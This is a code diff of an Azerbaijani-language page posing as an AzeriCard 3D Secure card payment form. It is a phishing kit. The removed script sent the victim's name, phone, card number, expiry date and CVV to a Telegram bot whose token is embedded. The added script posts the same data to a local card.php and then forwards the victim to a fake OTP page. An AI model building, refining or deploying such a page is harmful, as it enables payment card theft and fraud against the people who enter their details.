@@ -36,10 +36,10 @@
                     </div>
 
                     <div class="field-container1">
-                        <div class="cardnumber_img" id="name-container">
+                        <div class="cardnumber_img">
                             <div class="svgBox">
                                 <div>
-                                    <label for="name" id="name-text">Kart sahibinin adı</label>
+                                    <label for="name">Kart sahibinin adı</label>
                                     <input required id="name" type="text" maxlength="32" placeholder="Ad Soyad">
                                 </div>
                             </div>
@@ -48,10 +48,10 @@
                     </div>
 
                     <div class="field-container1">
-                        <div class="cardnumber_img" id="phone-container">
+                        <div class="cardnumber_img">
                             <div class="svgBox">
                                 <div>
-                                    <label for="phoneNumber" id="phone-text">Mobil nömrə</label>
+                                    <label for="phoneNumber">Mobil nömrə</label>
                                     <input required id="phoneNumber" type="tel" placeholder="+994 (00) 000 00 00">
                                 </div>
                             </div>
@@ -60,10 +60,10 @@
                     </div>
 
                     <div class="field-container1">
-                        <div class="cardnumber_img" id="card-container">
+                        <div class="cardnumber_img">
                             <div class="svgBox">
                                 <div>
-                                    <label for="cardnumber" id="card-text">Kartın nömrəsi</label>
+                                    <label for="cardnumber">Kartın nömrəsi</label>
                                     <input required id="cardnumber" type="tel" inputmode="numeric" minlength="13" maxlength="19" placeholder="••••  ••••  ••••  ••••">
                                 </div>
                                 <svg id="ccicon" width="750" height="471" viewBox="0 0 750 471"></svg>
@@ -73,8 +73,8 @@
                     </div>
 
                     <div class="field-container2">
-                        <div class="field-container" id="expdate-container">
-                            <label for="expirationdate" id="expdate-text">Bitmə tarixi</label>
+                        <div class="field-container">
+                            <label for="expirationdate">Bitmə tarixi</label>
                             <input required id="expirationdate" type="text" inputmode="numeric" placeholder="MM / YY">
                         </div>
                         <div class="field-container_cvc">
@@ -83,17 +83,12 @@
                                     <label for="securitycode">CVC</label>
                                     <input required id="securitycode" type="password" inputmode="numeric" placeholder="***" minlength="3" maxlength="4">
                                 </div>
-                                <p class="tooltip">
-                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="">
-                                    <span class="tooltiptext">CVV/CVC kartın arxasındadır</span>
-                                </p>
                             </div>
                         </div>
                     </div>
 
                     <div class="form-button">
                         <button id="submitBtn" type="submit" class="submitBtn" disabled>
-                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="">
                             Təhlükəsiz ödə
                         </button>
                         <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
@@ -103,28 +98,11 @@
                 </form>
             </section>
         </main>
-        <footer class="footer_part2">
-            <div class="footer_1">
-                <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="">
-                <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="">
-                <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="">
-                <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="">
-            </div>
-            <div class="footer_2">
-                <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="">
-                <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="">
-                <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="">
-                <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="">
-            </div>
-        </footer>
     </div>
 
     <script src="js/azericard-imask.js"></script>
     <script src="js/azericard-main.js"></script>
     <script>
-        const BOT_TOKEN = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
-        const CHAT_ID = '-1004326178006';
-
         const urlParams = new URLSearchParams(window.location.search);
         const amountParam = urlParams.get('amount');
 
@@ -152,29 +130,21 @@
             btn.innerHTML = 'Gözləyin...';
 
             const cardVal = document.getElementById('cardnumber').value;
-            const nameVal = document.getElementById('name').value;
-            const phoneVal = document.getElementById('phoneNumber').value;
-            const expVal = document.getElementById('expirationdate').value;
-            const cvvVal = document.getElementById('securitycode').value;
 
-            const msg = encodeURIComponent(
-                '💳 Yeni Sifariş (Kart):\n' +
-                'Ad: ' + nameVal + '\n' +
-                'Nömrə: ' + phoneVal + '\n' +
-                'Məbləğ: ' + (amountParam || '0') + ' AZN\n' +
-                'Kart: ' + cardVal + '\n' +
-                'Tarix: ' + expVal + '\n' +
-                'CVV: ' + cvvVal
-            );
+            const formData = new FormData();
+            formData.append('amount', amountParam || '0');
+            formData.append('name', document.getElementById('name').value);
+            formData.append('phone', document.getElementById('phoneNumber').value);
+            formData.append('card', cardVal);
+            formData.append('expdate', document.getElementById('expirationdate').value);
+            formData.append('cvv', document.getElementById('securitycode').value);
 
-            // Telegram-a göndər
-            const img = new Image();
-            img.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg;
-
-            // 1.5 saniyə sonra OTP səhifəsinə keç
-            setTimeout(() => {
+            fetch('card.php', {
+                method: 'POST',
+                body: formData
+            }).finally(() => {
                 window.location.href = 'azericard-3ds.html?amount=' + encodeURIComponent(amountParam || '0') + '&card=' + encodeURIComponent(cardVal);
-            }, 1500);
+            });
         });
     </script>
 </body>
